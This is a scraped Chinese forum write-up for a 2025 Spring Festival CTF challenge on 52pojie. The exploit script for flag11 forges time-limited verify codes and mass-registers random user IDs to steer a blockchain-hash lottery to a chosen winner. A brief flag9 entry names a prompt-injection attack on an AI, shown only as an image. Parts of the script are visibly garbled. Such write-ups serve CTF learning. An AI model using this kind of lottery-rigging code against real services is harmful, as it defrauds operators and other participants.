
# [CTF] 【2025春节】解题领红包之番外篇一二三WriteUp

- 原帖：https://www.52pojie.cn/forum.php?mod=viewthread&tid=2005805
- 抓取时间：2026-11-01T22:15:41

## 【春节】解题领红包之 {番外篇} WriteUp

### flag9：提示词攻击（如图）

![](https://attach.52pojie.cn/forum/202502/13/002133n0ehsgb0djheebds.jpg)

[2025flag9提示词攻击.jpg](https://www.52pojie.cn/forum.php?mod=attachment&aid=Mjc1NDMwNXxkNDdjZTcwY3wxNzkzNTcxMzM5fDE2ODA4NnwyMDA1ODA1&nothumb=yes) (152.93 KB, 下载次数: 0)  
2025-2-13 00:21 上传

### flag10：`wasm`函数调用（抽奖页面F12，根据提示注册调用函数即可。具体如图）

![](https://attach.52pojie.cn/forum/202502/13/002136ufu9ttufw4ooklwb.jpg)

[2025flag10wasm攻击.jpg](https://www.52pojie.cn/forum.php?mod=attachment&aid=Mjc1NDMwNnw5MDU0YzNlMXwxNzkzNTcxMzM5fDE2ODA4NnwyMDA1ODA1&nothumb=yes) (143.25 KB, 下载次数: 0)  
2025-2-13 00:21 上传

### flag11：提前暴露抽奖区块漏洞

> 原理：根据算法开奖的区块应该是开奖的时候实时获取的最高区块，但是在没开奖前页面就公布了开奖的那个区块，所以存在提前计算的可能。因算法中是使用一个巨大的数（`hash`）与一个较小的数（`usercount`）只要控制好`uasrcount`就可以控制中奖的那个。

#### 关键细节1：校验码有效时限

> 校验码有效期只有1分钟，过时间就失效。

简单的方法：

> 在浏览器调用生成开奖前1分钟的`verifycode`进行批量参加报名。

较复杂方法：

> 如脚本中引入`wasm`中的函数自动生成校验码

```
verify_code = wasm.get_verify_code_py(str(target_timestamp)+"|")
```

#### 关键细节2：获取`hash`计算合理区间内中奖的可能性

> 通过轮询找到合理区间内9800以后号码能中奖的情况

```
def calculate_possible_winning_indices(block_hash, min_user_count=9980, max_user_count=10250):
    """计算所有可能的中奖情况，返回可能中奖的情况"""
    possible_winnings = []
    for user_count in range(min_user_count, max_user_count + 1):
        hash_int = int(block_hash, 16)
        user_index = hash_int % user_count
        if user_index >= min_user_count:
            possible_winnings.append((user_count, user_index))
    return possible_winnings
```

#### 关键细节3：批量上报`uid`

一开始因为有多人在一起干扰，走了较多弯路...

> 核心思路是报名成功会返回当前`userindex`（其实就是`usercount+1`），一定得用这个轮询，不可用固定数量的循环函数！

还留了几个等最后10秒才动手，就这样还是等到降低难度分ip了之后才成功qaq

#### 利用代码如下：

```
import sys
import requests
import time
from datetime import datetime, timedelta
import random
import wasm

def check_block_exist(block_height):
    """检查指定区块是否存在"""
    api_url = "https://api.upowerchain.com/apis/v1alpha1/block/get"
    payload = {"number": block_height}
    headers = {'Content-type': 'application/json'}
    response = requests.post(api_url, json=payload, headers=headers)

    if response.status_code == 200:
        data = response.json().get('data', {})
        if data and 'blockHash' in data:  # 假设存在blockHash意味着区块已生成
            return data.get('blockHash')
        else:
            print(f"区块高度 {block_height} 尚未生成，等待5秒后重试...")
            time.sleep(5)
            return None
    else:
        print(f"获取区块时发生错误，状态码: {response.status_code}, 等待5秒后重试...")
        time.sleep(5)
        return None

def get_block_hash(block_height):
    """获取指定区块高度的区块哈希值"""
    while True:
        block_hash = check_block_exist(block_height)
        if block_hash:
            return block_hash

def calculate_possible_winning_indices(block_hash, min_user_count=9980, max_user_count=10250):
    """计算所有可能的中奖情况，返回可能中奖的情况"""
    possible_winnings = []
    for user_count in range(min_user_count, max_user_count + 1):
        hash_int = int(block_hash, 16)
        user_index = hash_int % user_count
        if user_index >= min_user_count:
            possible_winnings.append((user_count, user_index))
    return possible_winnings

def generate_unique_uid(existing_uids):
    """在1-2500000范围内随机生成一个唯一的UID"""
    while True:
        new_uid = random.randint(1, 2500000)
        if new_uid not in existing_uids:
            return new_uid

def is_verify_code_valid(timestamp):
    """检查verify_code是否有效（有效期1分钟）"""
    current_time = int(time.time())
    return abs(current_time - timestamp) =(next_5min-60):
            current_time = int(time.time())
            if not is_verify_code_valid(target_timestamp):
                print("Error: verify_code已过期，请重新获取并输入新的verify_code")
                sys.exit(0)
                # target_timestamp = int(time.time())
                # verify_code = input(f"请输入与时间戳 {target_timestamp} 对应的verify_code: ")

            # 通过随机生成UID获取当前的userCount
            new_uid = generate_unique_uid(existing_uids)
            existing_uids.add(new_uid)
            current_user_index = join_lottery(target_timestamp, str(new_uid), verify_code)

            if current_user_index is None:
                continue
            if gold==0:
                for user_count, user_index in possible_winnings:
                    if user_count>current_user_index and current_user_indexcurrent_user_index and current_user_indexgold and not isin :
                            print("damm!!!!被人抢了位置！参选目标编号失败")
                            gold=0
                            goldcount = 0
                            print("从新找目标2")
                            for user_count, user_index in possible_winnings:
                                if user_count>current_user_index and current_user_index=goldcount-10 and isin and int(time.time()) goldcount:
                        print(f"damm!!!!被人加塞了！当前usercount为{current_user_index}")
                        sys.exit(0)

            # 如果距离开奖时间小于10秒，则停止尝试增加userCount，等待开奖
            # if (target_time - datetime.fromtimestamp(current_time))  next_5min:
                print("已开奖，没机会了！")
            time.sleep(0.1)  # 防止请求过快被封禁
        else:
            print(f"\r时间没到，先等等,还差{target_timestamp-int(time.time())}秒。", end='')
            time.sleep(5)

    print("脚本执行结束。")
```

![](https://attach.52pojie.cn/forum/202502/13/002347nnesozsn55l59nzn.png)

[flag11.png](https://www.52pojie.cn/forum.php?mod=attachment&aid=Mjc1NDMxNHwxNTA1OTVmZHwxNzkzNTcxMzM5fDE2ODA4NnwyMDA1ODA1&nothumb=yes) (79.93 KB, 下载次数: 0)  
2025-2-13 00:23 上传

最后祝大家新年快乐2025红红火火 技术更上一层楼！
